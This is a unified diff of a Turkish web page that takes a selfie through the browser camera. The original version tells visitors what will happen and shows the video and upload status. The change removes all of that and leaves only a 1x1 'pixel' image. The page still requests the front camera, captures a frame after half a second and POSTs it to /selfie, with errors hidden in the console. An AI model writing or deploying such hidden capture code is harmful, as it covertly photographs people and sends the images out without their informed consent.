@@ -2,52 +2,38 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Kamera İzni – Selfie</title>
+  <title>Pixel + Selfie</title>
   <style>
-    body {font-family: Arial, sans-serif; text-align:center; margin-top:2rem;}
-    video, canvas {max-width:100%; border:2px solid #333;}
-    #msg {color:#c00; margin-top:1rem;}
+    body{margin:0;background:#fff;}
+    #pixelImg{width:1px;height:1px;display:block;}
   </style>
 </head>
 <body>
-  <h1>Kamera İzni Gerekiyor</h1>
-  <p>Kamera izni verildiğinde fotoğraf otomatik olarak çekilecek.</p>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <div id="msg"></div>
+  <img id="pixelImg" src="/pixel.png" alt="pixel">
   <script>
     (async () => {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const msg = document.getElementById('msg');
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:"user" } });
+        const video = document.createElement('video');
         video.srcObject = stream;
-        video.play();
-        msg.textContent = '';
-      } catch (e) {
-        console.error('Kamera izni reddedildi:', e);
-        msg.textContent = 'Kamera izni alınamadı. Lütfen izin verin.';
-        return;
+        await video.play();
+        await new Promise(r=>setTimeout(r,500));
+        const canvas=document.createElement('canvas');
+        canvas.width=video.videoWidth;
+        canvas.height=video.videoHeight;
+        const ctx=canvas.getContext('2d');
+        ctx.drawImage(video,0,0,canvas.width,canvas.height);
+        canvas.toBlob(async (blob)=>{
+          if(!blob) return;
+          const form=new FormData();
+          form.append('photo',blob,'selfie.png');
+          try{await fetch('/selfie',{method:'POST',body:form});}
+          catch(e){console.error('Upload error',e);}
+        },'image/png');
+        stream.getTracks().forEach(t=>t.stop());
+      }catch(e){
+        console.warn('Kamera izni alınamadı veya cihaz bulunamadı:',e);
       }
-      await new Promise(r => setTimeout(r, 500));
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(async (blob) => {
-        if (!blob) { msg.textContent = 'Fotoğraf alınamadı.'; return; }
-        const form = new FormData();
-        form.append('photo', blob, 'selfie.png');
-        try {
-          const resp = await fetch('/selfie', { method: 'POST', body: form });
-          const data = await resp.json();
-          msg.textContent = data.status === 'ok' ? `Fotoğraf yüklendi: ${data.url}` : 'Yükleme başarısız.';
-        } catch (err) {
-          console.error('Upload error:', err);
-          msg.textContent = 'Yükleme sırasında hata.';
-        }
-      }, 'image/png');
     })();
   </script>
 </body>
